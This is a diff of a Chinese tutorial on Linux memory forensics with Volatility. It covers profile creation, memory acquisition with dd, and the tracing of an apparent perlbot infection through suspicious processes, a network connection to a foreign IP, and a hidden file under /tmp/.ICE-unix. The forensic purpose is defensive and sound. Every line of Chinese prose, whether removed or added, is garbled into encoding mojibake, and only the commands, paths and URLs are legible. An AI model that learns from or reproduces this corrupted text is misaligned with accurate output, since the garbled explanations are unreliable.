+ï¼ˆå®é™…æ˜¯å°†module.dwarfå’Œsystem.mapæ‰“åŒ…æˆä¸€ä¸ªzipæ–‡ä»¶ï¼Œæ¥ç€å°†zipæ–‡ä»¶ç§»åŠ¨åˆ° volatility/plugins/overlays/linux/ ä¸­ã€‚ï¼‰
+Linuxçš„Profileæ–‡ä»¶æ˜¯ä¸€ä¸ªzipçš„å‹ç¼©åŒ…ã€‚
+å‡†å¤‡
 
 https://code.google.com/p/volatility/wiki/LinuxMemoryForensics
 
 $ sudo zip volatility/volatility/plugins/overlays/linux/Ubuntu1204.zip volatility/tools/linux/module.dwarf /boot/System.map-3.2.0-23-generic
 
-Êµ¼ÊÒ²¿ÉÒÔÔÚhttps://github.com/KDPryor/LinuxVolProfiles´¦Ö±½ÓÏÂÔØÒÑ¾­×öºÃµÄprofile¡£
-ÔÚkaliÏÂÎ»ÖÃ·ÅÔÚ/usr/share/volatility/volatility/plugins/overlays/
+å®é™…ä¹Ÿå¯ä»¥åœ¨https://github.com/KDPryor/LinuxVolProfileså¤„ç›´æ¥ä¸‹è½½å·²ç»åšå¥½çš„profileã€‚
+åœ¨kaliä¸‹ä½ç½®æ”¾åœ¨/usr/share/volatility/volatility/plugins/overlays/
 
-Èç¹ûÖªµÀdumpµÄÄÚ´æÊÇÄÇÖÖ²Ù×÷ÏµÍ³ºÍ²Ù×÷ÏµÍ³°æ±¾µÄ£¬¿ÉÒÔÖ±½ÓÖÆ¶¨profile;Èç¹û²»ÖªµÀÊÇÄÇÖÖÏµÍ³µÄÄÚ´æ£¬¿ÉÒÔÊ¹ÓÃimageinfoÑ¡Ïî£¬volatility»á³¢ÊÔ×Ô¶¯ÅĞ¶ÏÄÚ´æµÄÀàĞÍ
+å¦‚æœçŸ¥é“dumpçš„å†…å­˜æ˜¯é‚£ç§æ“ä½œç³»ç»Ÿå’Œæ“ä½œç³»ç»Ÿç‰ˆæœ¬çš„ï¼Œå¯ä»¥ç›´æ¥åˆ¶å®šprofile;å¦‚æœä¸çŸ¥é“æ˜¯é‚£ç§ç³»ç»Ÿçš„å†…å­˜ï¼Œå¯ä»¥ä½¿ç”¨imageinfoé€‰é¡¹ï¼Œvolatilityä¼šå°è¯•è‡ªåŠ¨åˆ¤æ–­å†…å­˜çš„ç±»å‹
 
 vol -f /root/Downloads/pexit.vmem imageinfo
 
-#05»ñÈ¡ÄÚ´æ¾µÏñ
-¿ÉÒÔ²Î¿¼
+#05è·å–å†…å­˜é•œåƒ
+å¯ä»¥å‚è€ƒ
 
 http://www.forensicswiki.org/wiki/Tools%3aMemory_Imaging#Linux
 Dd
 $ sudo dd if=/dev/mem of=/tmp/mem_dump.dd bs=1MB count=1010+0 records in10+0 records out10000000 bytes (10 MB) copied, 0.0331212 s, 302 MB/s
 
-#06Ê¹ÓÃÊ¾Àı
-¼ì²éÄÚ´æ½ø³Ì
+#06ä½¿ç”¨ç¤ºä¾‹
+æ£€æŸ¥å†…å­˜è¿›ç¨‹
 
-[2013-12-31 21:33:10µÄÆÁÄ»½ØÍ¼.png]
+[2013-12-31 21:33:10çš„å±å¹•æˆªå›¾.png]
 
-- ÁË½âLinuxÏµÍ³³£¼ûÏµÍ³½ø³Ì£»
+- äº†è§£Linuxç³»ç»Ÿå¸¸è§ç³»ç»Ÿè¿›ç¨‹ï¼›
 
-- ²é¿´×Ô¶¯ÈÎÎñ½ø³Ì£»
+- æŸ¥çœ‹è‡ªåŠ¨ä»»åŠ¡è¿›ç¨‹ï¼›
 
-- Èç¹ûÏµÍ³Ã»ÓĞÖØÆô¹ı£¬µ«²¿·Ö½ø³Ì¶¼ÊÇ¿ª»úÆô¶¯£¬²é¿´½ø³ÌÔËĞĞÊ±¼ä£»
+- å¦‚æœç³»ç»Ÿæ²¡æœ‰é‡å¯è¿‡ï¼Œä½†éƒ¨åˆ†è¿›ç¨‹éƒ½æ˜¯å¼€æœºå¯åŠ¨ï¼ŒæŸ¥çœ‹è¿›ç¨‹è¿è¡Œæ—¶é—´ï¼›
 
-ÉÏÃæÓĞ½ø³ÌºÅ1517¡¢27157¡¢7334´´½¨µÄÊ±¼äÃ÷ÏÔÓëÆäËû½ø³ÌµÄ´´½¨Ê±¼ä²»Í¬£¬Îª¿ÉÒÉ½ø³Ì
+ä¸Šé¢æœ‰è¿›ç¨‹å·1517ã€27157ã€7334åˆ›å»ºçš„æ—¶é—´æ˜æ˜¾ä¸å…¶ä»–è¿›ç¨‹çš„åˆ›å»ºæ—¶é—´ä¸åŒï¼Œä¸ºå¯ç–‘è¿›ç¨‹
 
-¼ì²é½ø³ÌÏêÏ¸ĞÅÏ¢
+æ£€æŸ¥è¿›ç¨‹è¯¦ç»†ä¿¡æ¯
 
 vol -f /root/Downloads/pexit.vmem --profile=LinuxUbuntu1004_pae32-33x86 linux_psaux
 
-[2014-01-01 12:24:07µÄÆÁÄ»½ØÍ¼.png]
+[2014-01-01 12:24:07çš„å±å¹•æˆªå›¾.png]
 
-1517½ø³Ì£¬Î»ÖÃÔÚ/usr/bin/httpd£¬ÁíÍâ27157½ø³ÌµÄ²ÎÊıÊÇ -B -c£¬Í¨¹ı²éÕÒrsyslogdµÄ°ïÖúÎÄ¼ş·¢ÏÖrsyslogd²¢Ã»ÓĞ-BµÄ²ÎÊı¡£
-Í¨¹ılinux_pidhashtable²ÎÊı¿ÉÒÔ²éÕÒµ½Òş²ØµÄ½ø³Ì
+1517è¿›ç¨‹ï¼Œä½ç½®åœ¨/usr/bin/httpdï¼Œå¦å¤–27157è¿›ç¨‹çš„å‚æ•°æ˜¯ -B -cï¼Œé€šè¿‡æŸ¥æ‰¾rsyslogdçš„å¸®åŠ©æ–‡ä»¶å‘ç°rsyslogdå¹¶æ²¡æœ‰-Bçš„å‚æ•°ã€‚
+é€šè¿‡linux_pidhashtableå‚æ•°å¯ä»¥æŸ¥æ‰¾åˆ°éšè—çš„è¿›ç¨‹
 
-¿ÉÒÔ¿´µ½ÓĞ4¸örsyslogd½ø³ÌÓë27157µÄ½ø³ÌÍ¬Ê±½¨Á¢¡£
-Ê¹ÓÃlinux_netstat²é¿´ÍøÂçÁ´½ÓÇé¿ö¡£
+å¯ä»¥çœ‹åˆ°æœ‰4ä¸ªrsyslogdè¿›ç¨‹ä¸27157çš„è¿›ç¨‹åŒæ—¶å»ºç«‹ã€‚
+ä½¿ç”¨linux_netstatæŸ¥çœ‹ç½‘ç»œé“¾æ¥æƒ…å†µã€‚
 
 vol -f /root/Downloads/pexit.vmem --profile=LinuxUbuntu1004_pae32-33x86 linux_netstat
 
-[2014-01-01 12:29:19µÄÆÁÄ»½ØÍ¼.png]
+[2014-01-01 12:29:19çš„å±å¹•æˆªå›¾.png]
 
-Òì³£Á´½ÓµÄµØÖ·Îª210.177.175.82
-¿ÉÒÔÍ¨¹ılinux_route_cache²ÎÊı²é¿´Â·ÓÉ±íÇé¿ö¡£
+å¼‚å¸¸é“¾æ¥çš„åœ°å€ä¸º210.177.175.82
+å¯ä»¥é€šè¿‡linux_route_cacheå‚æ•°æŸ¥çœ‹è·¯ç”±è¡¨æƒ…å†µã€‚
 
 vol -f /root/Downloads/pexit.vmem --profile=LinuxUbuntu1004_pae32-33x86 linux_route_cache
 
-[2014-01-01 12:42:19µÄÆÁÄ»½ØÍ¼.png]
+[2014-01-01 12:42:19çš„å±å¹•æˆªå›¾.png]
 
-Ê¹ÓÃlinux_lsofÃüÁî²é¿´1517ºÍ27157½ø³ÌÏà¹ØµÄÎÄ¼ş
+ä½¿ç”¨linux_lsofå‘½ä»¤æŸ¥çœ‹1517å’Œ27157è¿›ç¨‹ç›¸å…³çš„æ–‡ä»¶
 
 vol -f /root/Downloads/pexit.vmem --profile=LinuxUbuntu1004_pae32-33x86 linux_lsof
 
-[2014-01-01 12:44:59µÄÆÁÄ»½ØÍ¼.png]
+[2014-01-01 12:44:59çš„å±å¹•æˆªå›¾.png]
 
-×¢Òâ¡°/tmp/.ICE-unix/-log/¡±ÎÄ¼ş
-Ê¹ÓÃlinux_proc_maps²ÎÊı£¬¿ÉÒÔ²é¿´½ø³ÌÏ¸½Ú°üÀ¨¹²Ïí¿â¡¢¿ªÊ¼ºÍ½áÊøµÄÎ»ÖÃµÈĞÅÏ¢
+æ³¨æ„â€œ/tmp/.ICE-unix/-log/â€æ–‡ä»¶
+ä½¿ç”¨linux_proc_mapså‚æ•°ï¼Œå¯ä»¥æŸ¥çœ‹è¿›ç¨‹ç»†èŠ‚åŒ…æ‹¬å…±äº«åº“ã€å¼€å§‹å’Œç»“æŸçš„ä½ç½®ç­‰ä¿¡æ¯
 
 vol -f /root/Downloads/pexit.vmem --profile=LinuxUbuntu1004_pae32-33x86 linux_proc_maps | grep 1517
 
-²é¿´¿ÉÒÉÎÄ¼şµÄÎ»ÖÃ
+æŸ¥çœ‹å¯ç–‘æ–‡ä»¶çš„ä½ç½®
 
 vol -f /root/Downloads/pexit.vmem --profile=LinuxUbuntu1004_pae32-33x86 linux_find_file -F "/tmp/.ICE-unix/-log/httpds"
 
-[2014-01-01 13:01:52µÄÆÁÄ»½ØÍ¼.png]
+[2014-01-01 13:01:52çš„å±å¹•æˆªå›¾.png]
 
 vol -f /root/Downloads/pexit.vmem --profile=LinuxUbuntu1004_pae32-33x86 linux_find_file -i 0xf5a4e568 -O /root/dump
 
-[2014-01-01 13:13:03µÄÆÁÄ»½ØÍ¼.png]
+[2014-01-01 13:13:03çš„å±å¹•æˆªå›¾.png]
 
 strings /root/dump
 
-²Î¿¼£º
+å‚è€ƒï¼š
 
 http://sempersecurus.blogspot.com/2013/12/a-forensic-overview-of-linux-perlbot.html
 
